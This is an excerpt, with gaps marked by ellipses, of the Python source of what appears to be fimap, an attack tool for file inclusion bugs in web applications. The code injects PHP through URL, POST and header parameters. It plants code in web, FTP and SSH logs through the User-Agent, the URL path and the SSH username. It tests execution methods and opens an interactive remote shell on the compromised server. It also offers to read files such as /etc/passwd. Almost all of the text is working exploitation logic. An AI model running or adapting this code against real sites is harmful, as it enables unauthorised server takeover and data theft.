...
class codeinjector(baseClass):
    ...
    def getPreparedComponents(self, shcode=None):
        ...
        if (ispost == 0):
            fpath = fpath.replace("%s=%s" % (
                param, paramvalue), "%s=%s" % (param, payload))
        elif (ispost == 1):
            postdata = postdata.replace("%s=%s" % (
                param, paramvalue), "%s=%s" % (param, payload))
        elif (ispost == 2):
            tmp = header_dict[vulnheaderkey]
            tmp = tmp.replace("%s=%s" % (param, paramvalue),
                              "%s=%s" % (param, payload))
        ...
        for item in langClass.getExecMethods():
            try:
                ...
                if (item.isUnix() and isUnix) or (item.isWindows() and not isUnix):
                    self._log("Testing execution thru '%s'..." %
                              (name), self.LOG_INFO)
                    ...
                    if (mode.find("A") != -1):
                        ...
                        code = self.executeRFI(
                            url, postdata, appendix, testload, header_dict)
                    elif (mode.find("L") != -1):
                    ...
                    if code != None and code.find(shell_test_result) != -1:
                        working_shell = item
                        self._log("Execution thru '%s' works!" %
                                  (name), self.LOG_ALWAYS)
                        if (kernel == None):
                            self._log("Requesting kernel version...",
                                      self.LOG_DEBUG)
                            uname_cmd = item.generatePayload(
                                xml2config.getKernelCode(isUnix))
                            kernel = self.__doHaxRequest(
                                url, postdata, mode, uname_cmd, langClass, suffix, headerDict=header_dict).strip()
                            self._log("Kernel received: %s" %
                                      (kernel), self.LOG_DEBUG)
                            domain.setAttribute("kernel", kernel)
                            self.saveXML()

                        break
                else:
                    self._log("Skipping execution method '%s'..." %
                              (name), self.LOG_DEBUG)
    ...
    def start(self, OnlyExploitable):
        ...
        if (mode.find("A") != -1 and mode.find("x") != -1):
            ...
            self._log("Testing %s-code injection thru User-Agent..." %
                      (language), self.LOG_INFO)
            code = self.__doHaxRequest(
                url, postdata, mode, php_test_code, langClass, suffix, headerDict=header_dict)

        elif (mode.find("P") != -1 and mode.find("x") != -1):
            # Some exploit which is exploitable by sending POST requests.
            self._log("Testing %s-code injection thru POST..." %
                      (language), self.LOG_INFO)
            code = self.__doHaxRequest(
                url, postdata, mode, php_test_code, langClass, suffix, headerDict=header_dict)
            ...
            if (mode.find("H") != -1):
                self._log("Testing %s-code injection thru Logfile HTTP-UA-Injection..." %
                          (language), self.LOG_INFO)
            elif (mode.find("F") != -1):
                self._log("Testing %s-code injection thru Logfile FTP-Username-Injection..." %
                          (language), self.LOG_INFO)
            elif (mode.find("S") != -1):
                self._log("Testing %s-code injection thru Logfile SSH-Username-Injection..." %
                          (language), self.LOG_INFO)
            code = self.__doHaxRequest(
                url, postdata, mode, php_test_code, langClass, suffix, headerDict=header_dict)
            ...
            if settings["dynamic_rfi"]["mode"] == "ftp":
                ...
                if (ispost == 0):
                    url = url.replace("%s=%s" % (param, payload), "%s=%s" % (
                        param, settings["dynamic_rfi"]["ftp"]["http_map"]))
                elif (ispost == 1):
                    postdata = postdata.replace("%s=%s" % (param, payload), "%s=%s" % (
                        param, settings["dynamic_rfi"]["ftp"]["http_map"]))
                elif (ispost == 2):
                    tmp = header_dict[vulnheaderkey]
                    tmp = tmp.replace("%s=%s" % (param, payload), "%s=%s" % (
                        param, settings["dynamic_rfi"]["ftp"]["http_map"]))
                    header_dict[vulnheaderkey] = tmp
                code = self.__doHaxRequest(
                    url, postdata, mode, php_test_code, langClass, appendix, headerDict=header_dict)

            elif settings["dynamic_rfi"]["mode"] == "local":
                self._log("Testing code thru LocalHTTP->RFI...", self.LOG_INFO)
                if (ispost == 0):
                    url = url.replace("%s=%s" % (param, payload), "%s=%s" % (
                        param, settings["dynamic_rfi"]["local"]["http_map"]))
                elif (ispost == 1):
                    postdata = postdata.replace("%s=%s" % (param, payload), "%s=%s" % (
                        param, settings["dynamic_rfi"]["local"]["http_map"]))
                elif (ispost == 2):
                ...
                print(
                    "fimap is currently not configured to exploit RFI vulnerabilities.")
                sys.exit(1)
        elif (mode.find("r") != -1):
            # Some point which we know that we can include files but we haven't found any good vectors.
            self._log(
                "You have selected a file which is only readable.", self.LOG_ALWAYS)
            self._log(
                "Let's see if one of our plugins is interested in it...", self.LOG_ALWAYS)
            textarr = []
            idx = 1
            choose = {}
                ...
                while (1 == 1):
                    ...
                    try:
                        ...
                        if (val < 0 or val > idx-1):
                            ...
                            haxhelper = HaxHelper(
                                self, url, postdata, mode, langClass, suffix, isUnix, sys_inject_works, None)
        ...
        if code == None:
            self._log("%s-code testing failed! code=None" %
                      (language), self.LOG_ERROR)
            sys.exit(1)

        if (code.find(php_test_result) != -1):
            self._log("%s Injection works! Testing if execution works..." %
                      (language), self.LOG_ALWAYS)
            php_inject_works = True

            working_shell = self.probeExecMethods(
                url, postdata, header_dict, domain, vuln)
            sys_inject_works = False
            ...
            while (attack != "q"):
                ...
                if (self.config["p_exploit_cmds"] != None):
                    ...
                    attack = self.chooseAttackMode(
                        language, php_inject_works, sys_inject_works, isUnix)
                ...
                if (type(attack) == str):
                    if (attack == "fimap_shell"):
                        ...
                        if (self.config["p_tabcomplete"]):
                            self._log(
                                "Setting up tab-completation...", self.LOG_DEBUG)
                            try:
                                import readline
                                ...
                                if (isUnix):
                                    ...
                                    ls_cmd = "dir /B"
                                self._log(
                                    "Epic Tab-completation enabled!", self.LOG_INFO)
                            except:
                                self._log(
                                    "Epicly failed to setup readline module!", self.LOG_WARN)
                                self._log(
                                    "Falling back to default exploit-shell.", self.LOG_WARN)

                        cmd = ""
                        print("Please wait - Setting up shell (one request)...")
                        #pwd_cmd = item.generatePayload("pwd;whoami")

                        commands = [xml2config.getCurrentDirCode(
                            isUnix), xml2config.getCurrentUserCode(isUnix)]
                        if (ls_cmd != None):
                            commands.append(ls_cmd)

                        pwd_cmd = working_shell.generatePayload(
                            xml2config.concatCommands(commands, isUnix))
                        tmp = self.__doHaxRequest(
                            url, postdata, mode, pwd_cmd, langClass, suffix, headerDict=header_dict).strip()
                        if (tmp.strip() == ""):
                            print(
                                "Failed to setup shell! The resulting string was empty!")
                            break
                        ...
                        while 1 == 1:
                            ...
                            if (self.config["p_exploit_cmds"] != None):
                                ...
                                if (len(self.config["p_exploit_cmds"]) > 0):
                                    ...
                                    self._log("Executing command: %s" %
                                              (cmd), self.LOG_INFO)
                                    del(self.config["p_exploit_cmds"][0])
                                else:
                                    self._log(
                                        "Done with user supplied command batch.", self.LOG_INFO)
                                    sys.exit(0)

                            else:
                                # Ask the user for a shell command.
                                cmd = input("fishell@%s:%s$> " %
                                            (curusr, curdir))
                            ...
                            try:
                                if (cmd.strip() != ""):
                                    commands = (xml2config.generateChangeDirectoryCommand(
                                        curdir, isUnix), cmd)
                                    cmds = xml2config.concatCommands(
                                        commands, isUnix)
                                    userload = working_shell.generatePayload(
                                        cmds)
                                    code = self.__doHaxRequest(
                                        url, postdata, mode, userload, langClass, suffix, headerDict=header_dict)
                                    if (cmd.startswith("cd ")):
                                        # Get Current Directory...
                                        commands = (xml2config.generateChangeDirectoryCommand(
                                            curdir, isUnix), cmd, xml2config.getCurrentDirCode(isUnix))
                                        cmds = xml2config.concatCommands(
                                            commands, isUnix)
                                        cmd = working_shell.generatePayload(
                                            cmds)
                                        curdir = self.__doHaxRequest(
                                            url, postdata, mode, cmd, langClass, suffix, headerDict=header_dict).strip()

                                        # Refresh Tab-Complete Cache...
                                        if (ls_cmd != None):
                                            self._log(
                                                "Refreshing Tab-Completation cache...", self.LOG_DEBUG)
                                            commands = (xml2config.generateChangeDirectoryCommand(
                                                curdir, isUnix), ls_cmd)
                                            cmds = xml2config.concatCommands(
                                                commands, isUnix)
                                            cmd = working_shell.generatePayload(
                                                cmds)
                                            tab_cache = self.__doHaxRequest(
                                                url, postdata, mode, cmd, langClass, suffix, headerDict=header_dict).strip()
                                            if (ls_cmd != None):
                                                dir_content = ",".join(
                                                    tab_cache.split("\n"))
                        ...
                        haxhelper = HaxHelper(
                            self, url, postdata, mode, langClass, suffix, isUnix, sys_inject_works, working_shell)
                    ...
                    code = self.__doHaxRequest(
                        url, postdata, mode, shellcode, langClass, appendix, headerDict=header_dict)
                    if (code == None):
            ...
            try:
                self._log(
                    "Injection not possible! It looks like a file disclosure bug.", self.LOG_WARN)
                self._log(
                    "fimap can currently not readout files comfortably.", self.LOG_WARN)
                go = input(
                    "Do you still want to readout files (even without filtering them)? [Y/n] ")
                if (go == "Y" or go == "y" or go == ""):
                    while 1 == 1:
                        ...
                        code = self.__doHaxRequest(
                            url, postdata, mode, "", langClass, appendix, False, headerDict=header_dict)
                        print("--- Unfiltered output starts here ---")
                        print(code)
                        print("--- EOF ---")
                else:
                    print(
                        "Cancelled. If you want to read out files by hand use this URL:")

                    if (not ispost):
                        path = fpath.replace("%s=%s" % (param, paramvalue), "%s=%s" % (
                            param, "ABSOLUTE_FILE_GOES_HERE"))
                        url = "http://%s%s" % (hostname, path)
                        print("URL: " + url)
                    else:
                        postdata = postdata.replace("%s=%s" % (
                            param, paramvalue), "%s=%s" % (param, "ABSOLUTE_FILE_GOES_HERE"))
                        url = "http://%s%s" % (hostname, path)
                        print("URL          : " + url)
    ...
    def __doHaxRequest(self, url, postdata, m, payload, langClass, appendix=None, doFilter=True, headerDict=None):
        ...
        userload = None
        if doFilter:
            userload = "%s %s %s" % (langClass.generatePrint(
                rndStart), payload, langClass.generatePrint(rndEnd))
        else:
        ...
        if (m.find("A") != -1):
            ...
            code = self.doPostRequest(
                url, postdata, additionalHeaders=headerDict)
        elif (m.find("P") != -1):
            if (postdata != ""):
                userload = "%s&%s" % (postdata, userload)
            code = self.doPostRequest(
                url, userload, additionalHeaders=headerDict)
        elif (m.find("R") != -1):
            code = self.executeRFI(
                url, postdata, appendix, userload, headerDict)
        elif (m.find("L") != -1):
            if (not self.isLogKickstarterPresent):
                self._log("Testing if log kickstarter is present...",
                          self.LOG_INFO)
                testcode = langClass.generateQuiz()
                p = "data=" + \
                    base64.b64encode(
                        self.convertUserloadToLogInjection(testcode[0]))
                if (postdata != ""):
                    p = "%s&%s" % (postdata, p)
                ...
                if (code.find(testcode[1]) == -1):
                    if (m.find("H") != -1):
                        self._log(
                            "Kickstarter is not present. Injecting kickstarter thru UserAgent...", self.LOG_INFO)
                        ...
                        self._log(
                            "Testing once again if kickstarter is present...", self.LOG_INFO)
                        testcode = langClass.generateQuiz()
                        p = "data=" + \
                            base64.b64encode(
                                self.convertUserloadToLogInjection(testcode[0]))
                        if (postdata != ""):
                            p = "%s&%s" % (postdata, p)
                        code = self.doPostRequest(
                            url, p, additionalHeaders=headerDict)

                        if (code.find(testcode[1]) == -1):
                            self._log(
                                "Failed to inject kickstarter thru UserAgent!", self.LOG_ERROR)
                            self._log(
                                "Trying to inject kickstarter thru Path...", self.LOG_INFO)
                            self._log(
                                "Ignore any 404 errors for the next request.", self.LOG_INFO)
                            kickstarter = langClass.getEvalKickstarter()
                            tmpurl = None
                            if (url.find("?") != -1):
                                tmpurl = url[:url.find("?")]
                            ...
                            tmpurl += "?" + kickstarter
                            self.doGetRequest(
                                tmpurl, additionalHeaders=headerDict)
                            ...
                            if (code.find(testcode[1]) != -1):
                                self._log(
                                    "Kickstarter successfully injected thru Path!", self.LOG_INFO)
                                self.isLogKickstarterPresent = True
                            else:
                                self._log(
                                    "Failed to inject kickstarter thru Path!", self.LOG_ERROR)
                                sys.exit(1)
                        else:
                            self._log(
                                "Kickstarter successfully injected! thru UserAgent!", self.LOG_INFO)
                            self.isLogKickstarterPresent = True
                    ...
                    if (m.find("S") != -1):
                        ...
                        if (ssh.paramikoInstalled == False):
                            self._log(
                                "I am soooo sorry bro but you need paramiko python module installed to use this feature!", self.LOG_ERROR)
                            self._log(
                                "$> sudo apt-get install python-paramiko # maybe? :)", self.LOG_ERROR)
                            sys.exit(1)

                        self._log(
                            "Kickstarter is not present. Injecting kickstarter thru SSH Username...", self.LOG_INFO)
                        kickstarter = langClass.getEvalKickstarter()
                        ...
                        if (hostname.startswith("www.")):
                            hostname = hostname[4:]
                        self._log("Trying to connect to ssh://'%s'" %
                                  (hostname), self.LOG_DEBUG)
                        self._log("SSH-Username: %s" %
                                  (kickstarter), self.LOG_DEVEL)

                        try:
                            ssh.Connection(
                                hostname, username=kickstarter, password="asdf")
                        except:
                            pass
    ...
    def testRFI(self):
        ...
        for langName, langObj in list(langClass.items()):
            ...
            if (settings["dynamic_rfi"]["mode"] == "local"):
                ...
                code = self.executeRFI(
                    settings["dynamic_rfi"]["local"]["http_map"], "", "", c, {})
                if (code == enc_c):
                    ...
                    for ext in langObj.getExtentions():
                        ...
                        code = self.executeRFI(
                            settings["dynamic_rfi"]["local"]["http_map"] + ext, "", ext, c, {})
                        if (code == r):
                            print(
                                "WARNING! Files which ends with %s will be interpreted! Fix that!" % (ext))
                        else:
                ...
                code = self.executeRFI(
                    settings["dynamic_rfi"]["ftp"]["http_map"], "", "", c, {})
                if (code != None):
                    code = code.strip()
                    if (code == enc_c):
                        print("Dynamic RFI works!")
                        for ext in langObj.getExtentions():
                            ...
                            code = self.executeRFI(
                                settings["dynamic_rfi"]["ftp"]["http_map"] + ext, "", ext, c, {})
                            if (code.find(r) != -1):
                                print(
                                    "WARNING! Files which ends with %s will be interpreted! Fix that!" % (ext))
                            else:
    ...
    def chooseAttackMode(self, language, php=True, syst=True, isUnix=True):
        ...
        if (syst):
            header = ":: Available Attacks - %s and SHELL access ::" % (
                language)
        ...
        pluginman = self.config["PLUGINMANAGER"]
        plugin_attacks = pluginman.requestPluginActions(
            langClass, syst, isUnix)
    ...
    def payload_encode(self, content):
        if (self.config["p_rfi_encode"] != None):
            if (self.config["p_rfi_encode"] == "php_b64"):
                content = "<?php echo base64_decode(\"%s\"); ?>" % (
    ...
    def chooseDomains(self, OnlyExploitable=True):
        ...
        if (idx == 1):
            ...
            if (missingCount > 0):
                print(
                    "There are some domains hidden tho because they can't be exploited by fimap without help.")
                print("To show them start fimap with *uppercase* -X")
            sys.exit(0)

        if (missingCount > 0):
            textarr.append(
                "[ ] And %d hosts with no valid attack vectors." % (missingCount))
        ...
        if (self.config["p_exploit_domain"] != None):
            ...
            self._log("Trying to autoselect target with hostname '%s'..." %
                      (wantedDomain), self.LOG_INFO)

            for n in nodes:
                if (n.getAttribute("hostname") == wantedDomain):
                    return(n)

            print("The domain '%s' doesn't exist! Can't continue :(" %
                  (wantedDomain))
            sys.exit(1)
        ...
        while(1 == 1):
            ...
            if (c == "q"):
                ...
                print(
                    "  It's likly that fimap has found an inclusion bug and was able to read out")
                print("  non executable files like '/etc/passwd' or 'c:\\boot.ini'.")
                print(
                    "  In cases like this it's not possible to automaticly attack the machine.")
                print(
                    "  However if you are able to upload a file on the webserver you have high")
                print("  chances to spawn a shell.")
                print("* Remote File Inclusion bugs:")
                print(
                    "  If you have found RFI only bugs you have to enable Dynamic RFI in order to")
                print(
                    "  exploit the bug with fimap. The RFI-Only domains will be hidden unless you")
                print("  have configured and enabled Dynamic RFI.")
                print(
                    "  However you can always take a look at the ~/fimap_result.xml , get your info")
    ...
    def chooseVuln(self, hostname):
        ...
        for n in nodes:
            ...
            if (mode.find("x") != -1 or (mode.find("R") != -1 and settings["dynamic_rfi"]["mode"] in ("ftp", "local"))):
                if (wantedID != None and wantedID == idx):
                    self._log("Autoselected vulnerability with ID %d." %
                              wantedID, self.LOG_INFO)
                    return(n)
                choose[idx] = n
                if (ispost == 0):
                    textarr.append(
                        "[%d] URL: '%s' injecting file: '%s' using GET-param: '%s'" % (idx, path, file, param))
                elif (ispost == 1):
                    textarr.append(
                        "[%d] URL: '%s' injecting file: '%s' using POST-param: '%s'" % (idx, path, file, param))
                elif (ispost == 2):
                    textarr.append(
                        "[%d] URL: '%s' injecting file: '%s' using HEADER-param: '%s'" % (idx, path, file, param))
                idx = idx + 1
            elif (mode.find("r") != -1):
        ...
        if (idx == 1):
            if (doRemoteWarn):
                print(
                    "WARNING: Some bugs can not be used because dynamic_rfi is not configured!")
...
class HaxHelper:
    ...
    def executeSystemCommand(self, command):
        ...
        if (self.canExecuteSystemCommands()):
            ...
            ret = self.parent_codeinjector._doHaxRequest(
                self.url, self.postdata, self.mode, cmd, self.langClass, self.suffix)
            if (ret != None):
                return(ret.strip())
            else:
                return(None)
    ...
    def getRawHTTPRequest(self, customFile):
        path, post, header, payload = self.parent_codeinjector.getPreparedComponents(
            customFile)
